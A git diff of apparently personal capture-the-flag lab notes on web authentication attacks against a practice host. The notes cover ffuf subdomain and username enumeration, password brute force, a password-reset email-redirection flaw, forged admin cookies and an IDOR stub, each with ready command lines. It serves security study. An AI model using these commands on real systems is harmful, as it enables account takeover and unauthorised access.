@@ -20,7 +20,7 @@
 7. ``` ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130 -fs {size} ``` -fs switch, which tells ffuf to ignore any results that are of the specified size.
 
 ## Authentication Bypass
-fuzz posibble exist usernames.
+**fuzz posibble exist usernames.**
 - https://github.com/ffuf/ffuf
 - ``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.94.177/customers/signup -mr "username already exists" ```
 -  -X argument specifies the request method.
@@ -29,14 +29,18 @@ fuzz posibble exist usernames.
 -  -u argument specifies the URL we are making the request to.
 -  -mr argument is the text on the page we are looking for to validate we've found a valid username.
 
-## brute force
+**brute force**
 - ``` ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.2.151/customers/login -fc 200 ```
 - -fc argument to check for an HTTP status code other than 200.
 
-## logic flaw
+**logic flaw**
 - ``` curl 'http://10.10.2.151/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm' ```
 - the server send email to the address client posts
 
-## cookie tempering
+**cookie tempering**
 - ``` curl -H "Cookie: logged_in=true; admin=true" http://10.10.2.151/cookie-test ```
 - Hash crack website. https://crackstation.net/
+
+## IDOR
+-  Insecure Direct Object Reference
+
